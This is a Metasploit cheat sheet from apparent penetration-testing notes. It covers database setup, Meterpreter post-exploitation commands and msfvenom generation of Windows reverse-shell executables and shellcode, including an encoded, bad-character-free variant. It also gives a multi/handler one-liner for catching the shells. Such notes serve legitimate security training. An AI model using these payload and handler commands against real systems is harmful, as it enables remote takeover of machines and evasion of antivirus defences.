# Metasploit

## Database

Init Metaspolit database.

```bash
sudo msfdb init
```

Run postgresql service.

```bash
sudo systemctl enable postgresql
```

### Workspaces

Change between workspaces for sperating the projects' databases.

```batch
workspace -a <workspace_name>
```

### Nmap

`db_nmap` is a Nmap binary wrapper which saves results into Metasploit's database enables explore results later combined.

`hosts` - show found hosts and their operating system.

`services` - show found services and which host runs them.



## Search Module

Metasploit module types:

* **Exploit Modules**: Code to exploit vulnerabilities in systems.
* **Payload Modules**: Code executed on the target post-exploitation.
* **Auxiliary Modules**: Tools for scanning and information gathering.
* **Post Modules**: Actions taken on a compromised system.
* **Encoder Modules**: Obfuscate payloads to evade detection.
* **Nop Generator Modules**: Create NOP sleds for buffer overflows.
* **Listener Modules**: Set up a listener for incoming connections.

```batch
search type:<module_type> <module_name>
search <module_name>
```

## Meterpeter

### System information

Get system info

```batch
sysinfo
```

Get current user

```batch
getuid 
```

### Network

{% code overflow="wrap" %}
```batch
arp # Display the host ARP cache
getproxy # Display the current proxy configuration
ifconfig # Display interfaces ipconfig Display interfaces netstat Display the network connections 
portfwd # Forward a local port to a remote service 
resolve # Resolve a set of host names on the target 
route # View and modify the routing table
```
{% endcode %}

### File System

commands with `l` prefix operate on the local system.

```batch
lcd <path>
lcat <file>
```

meterpeter allows extra file system commands like download or upload files from the local system to the target.

```batch
download <target_path> <local_path>
upload <local_path> <target_path>
```

### Channels

```batch
channels -l # listing channels
channels -i <channel_id> # use other channel
```

## MSFVenom

### Payloads

Search payloads for target platform

```batch
msfvenom -l payloads --platform windows --arch x64
```

Create executable payloads&#x20;

{% code overflow="wrap" %}
```batch
 # staged
msfvenom -p windows/x64/shell/reverse_tcp LHOST=<host> LPORT=<port> -f exe -o rev.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -f exe -o rev.exe
 # not staged
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<host> LPORT=<port> -f exe -o rev.exe
```
{% endcode %}

Generating shell code

{% code overflow="wrap" %}
```batch
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f powershell -v sc
```
{% endcode %}

Generating obfuscated shell code with bad words:

{% code overflow="wrap" %}
```batch
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```
{% endcode %}

### Multi Handler

oneliner for multi handler

{% code overflow="wrap" %}
```bash
sudo msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <LHOST>;set LPORT <LPORT>;run;"
```
{% endcode %}

## References

{% embed url="https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/" %}

{% embed url="https://www.offsec.com/metasploit-unleashed/" %}
